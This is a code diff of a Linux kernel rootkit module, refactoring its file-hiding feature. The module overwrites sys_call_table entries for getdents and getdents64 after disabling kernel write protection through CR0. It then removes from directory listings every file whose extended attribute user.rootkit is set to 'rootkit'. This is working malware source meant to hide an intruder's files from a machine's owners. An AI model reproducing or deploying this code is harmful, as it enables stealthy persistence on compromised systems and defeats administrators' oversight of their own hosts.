@@ -1,13 +1,16 @@
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
-#include <linux/xattr.h>
 #include <linux/fs.h>
+#include <linux/xattr.h>
 #include <linux/fdtable.h>
+#include <linux/list.h>
 
 #include "common.h"
 #include "hook.h"
+#include "rootkit.h"
+#include "filehide.h"
 
-#define SIZE 512
+extern rootkit_t rootkit;
 
 void **sys_calls;
 
@@ -15,10 +18,10 @@ asmlinkage long (*sys_getdents)(const struct pt_regs *);
 asmlinkage long (*sys_getdents64)(const struct pt_regs *);
 
 struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[1];
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
 };
 
 int
@@ -33,20 +36,17 @@ init_hooks(void)
 {
     sys_getdents = (void *)sys_calls[__NR_getdents];
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
-
-    disable_protection();
-    sys_calls[__NR_getdents] = (unsigned long) g7_getdents;
-    sys_calls[__NR_getdents64] = (unsigned long) g7_getdents64;
-    enable_protection();
 }
 
 void
 remove_hooks(void)
 {
-    disable_protection();
-    sys_calls[__NR_getdents] = sys_getdents;
-    sys_calls[__NR_getdents64] = sys_getdents64;
-    enable_protection();
+    if (rootkit.hiding_files) {
+        disable_protection();
+        sys_calls[__NR_getdents] = (void *)sys_getdents;
+        sys_calls[__NR_getdents64] = (void *)sys_getdents64;
+        enable_protection();
+    }
 }
 
 void
@@ -59,26 +59,6 @@ void
 enable_protection(void)
 {
     write_cr0(read_cr0() | 0x10000);
-}
-
-
-static bool
-must_hide(struct dentry *dentry)
-{
-    char buf[SIZE];
-    vfs_getxattr(dentry, "user.rootkit", buf, SIZE);
-    return !strcmp("rootkit", buf);
-}
-
-
-static int
-g7_compare_inodes(unsigned long inode, unsigned long *ino_array, int ino_count)
-{
-    for(int i = 0; i < ino_count; i++)
-        if(inode == ino_array[i])
-            return 1;
-
-    return 0;
 }
 
 
@@ -108,33 +88,23 @@ g7_getdents(const struct pt_regs *pt_regs)
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
     kdirent_inode = kdirent_dentry->d_inode;
 
-    //Store all inode numbers that have xattrs set
-    //TODO better implementation, a limit of 256 is stupid (or is it?)
-    unsigned long *ino_array;
-    int ino_count;
-    ino_array = kmalloc(256 * sizeof(unsigned long), GFP_KERNEL);
-    ino_count = 0;
+    inode_list_t hidden_inodes = { 0, NULL };
+    inode_list_t_ptr hi_head = &hidden_inodes;
+    inode_list_t_ptr hi_tail = &hidden_inodes;
 
-    // TODO
     struct list_head *i;
     list_for_each(i, &kdirent_dentry->d_subdirs) {
+        unsigned long inode;
         struct dentry *child = list_entry(i, struct dentry, d_child);
-        if(child && child->d_inode)
-            if(!inode_permission(child->d_inode, MAY_READ)) {
-                char* buf = kmalloc(256, GFP_KERNEL);
-                ssize_t sz = vfs_getxattr(child, "user.rootkit", buf, 256);
 
-                if(!strncmp("rootkit", buf, sz))
-                    ino_array[ino_count++] = child->d_inode->i_ino;
-
-                kfree(buf);
-            }
+        if ((inode = must_hide_inode(child)))
+            hi_tail = add_inode_to_list(hi_tail, inode);
     }
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);
 
-        if (g7_compare_inodes(cur_kdirent->d_ino, ino_array, ino_count)) { // TODO: detect xattrs user.rootkit = rootkit
+        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
                 memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
@@ -162,8 +132,6 @@ g7_getdents64(const struct pt_regs *pt_regs)
 {
     typedef struct linux_dirent64 *dirent64_t_ptr;
 
-    bool musthide = false;
-
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
@@ -183,36 +151,23 @@ g7_getdents64(const struct pt_regs *pt_regs)
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
     kdirent_inode = kdirent_dentry->d_inode;
 
-    //musthide = must_hide(kdirent_dentry);
-    //DEBUG_INFO("must hide from 64: %d", musthide);
+    inode_list_t hidden_inodes = { 0, NULL };
+    inode_list_t_ptr hi_head = &hidden_inodes;
+    inode_list_t_ptr hi_tail = &hidden_inodes;
 
-    //Store all inode numbers that have xattrs set
-    //TODO better implementation, a limit of 256 is stupid (or is it?)
-    unsigned long *ino_array;
-    int ino_count;
-    ino_array = kmalloc(256 * sizeof(unsigned long), GFP_KERNEL);
-    ino_count = 0;
-
-    // TODO
     struct list_head *i;
     list_for_each(i, &kdirent_dentry->d_subdirs) {
+        unsigned long inode;
         struct dentry *child = list_entry(i, struct dentry, d_child);
-        if(child && child->d_inode)
-            if(!inode_permission(child->d_inode, MAY_READ)) {
-                char* buf = kmalloc(256, GFP_KERNEL);
-                ssize_t sz = vfs_getxattr(child, "user.rootkit", buf, 256);
 
-                if(!strncmp("rootkit", buf, sz))
-                    ino_array[ino_count++] = child->d_inode->i_ino;
-
-                kfree(buf);
-            }
+        if ((inode = must_hide_inode(child)))
+            hi_tail = add_inode_to_list(hi_tail, inode);
     }
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
 
-        if (g7_compare_inodes(cur_kdirent->d_ino, ino_array, ino_count)) { // TODO: detect xattrs user.rootkit = rootkit
+        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
                 memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
@@ -229,7 +184,6 @@ g7_getdents64(const struct pt_regs *pt_regs)
     copy_to_user(dirent, kdirent, ret);
 
 yield:
-    kfree(ino_array);
     kfree(kdirent);
     return ret;
 }
